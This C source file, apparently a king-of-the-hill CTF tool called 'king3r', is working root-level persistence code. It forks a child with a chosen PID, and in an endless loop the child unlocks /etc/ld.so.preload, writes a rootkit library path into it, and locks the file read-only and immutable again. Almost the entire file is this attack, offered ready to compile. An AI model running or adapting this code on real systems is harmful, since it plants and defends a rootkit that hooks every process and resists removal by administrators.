#include <fcntl.h>
#include <linux/fs.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <time.h>
#include <unistd.h>

// king3r (aka. kothv4)  ~@profxadke

#define RK_PATH "/etc/ld.so.preload"
#define RK_TEXT "/usr/local/lib/rootkit.so"


int randint(int min, int max) {
    return (rand() % (max - min + 1)) + min;
}


void* kingMe(void* vargp) {
    for (;;) {
        sleep(0.9);
        FILE *fp;
        FILE *afp;

        // Unlock
        if ((fp = fopen(RK_PATH, "r")) == NULL) {
            perror("[unlock] fopen(3) error");
        } else {
                int val = 0;
                if (ioctl(fileno(fp), FS_IOC_SETFLAGS, &val) < 0)
                perror("[unlock] ioctl(2) error");
            fclose(fp);
        }

        // Write
        if ((fp = fopen(RK_PATH, "w")) == NULL) {
            perror("[write] fopen(3) error");
        }
        fputs(RK_TEXT, fp);
        fclose(fp);

        // Change permissions + Lock
        if ((fp = fopen(RK_PATH, "r")) == NULL) {
            perror("[chmod] fopen(3) error");
        } else {
            chmod(RK_PATH, S_IRUSR | S_IRGRP | S_IROTH);
            int vul = 16;
            if (ioctl(fileno(fp), FS_IOC_SETFLAGS, &vul) < 0)
                perror("[lock] ioctl(2) error");
            fclose(fp);
        }

    }; return NULL;
}


int main(int argc, char *argv[]) {

    srand(time(NULL));
    int fd;
    char buf[32];
    // int pid = randint(100, 999);
    int pid = 333;
    pthread_t thread_id;

    fd = open("/proc/sys/kernel/ns_last_pid", O_RDWR | O_CREAT, 0644);
    if (fd < 0) {
        perror("Can't open /proc/sys/kernel/ns_last_pid are you uid=0?");
        return 1;
    }; if (flock(fd, LOCK_EX)) {
        // printf("Coudldn't lock.\n");
        close(fd);
        // Couldn't lock.
        return 1;
    }; snprintf(buf, sizeof(buf), "%d", pid - 1);

    if (write(fd, buf, strlen(buf)) != strlen(buf)) {
        // printf("Couldn't write.\n");
        // Couldn't write.
        return 1;
    }; int new_pid;

    new_pid = fork();

    // printf("PPID:%d\tPID:%d\t", pid, new_pid);

    if ( new_pid == 0 ) {
        pthread_create(&thread_id, NULL, kingMe, NULL);
        pthread_join(thread_id, NULL);
    } else if (pid == new_pid) {
        // Back to parent.
        // printf("Now, check the PID!");
        if (flock(fd, LOCK_UN)) {
            // Unlocked.
        }; close(fd);
    } else {
        // Didn't work :/
        // printf("Didn't work :/\n");
    }

    return 0;

}
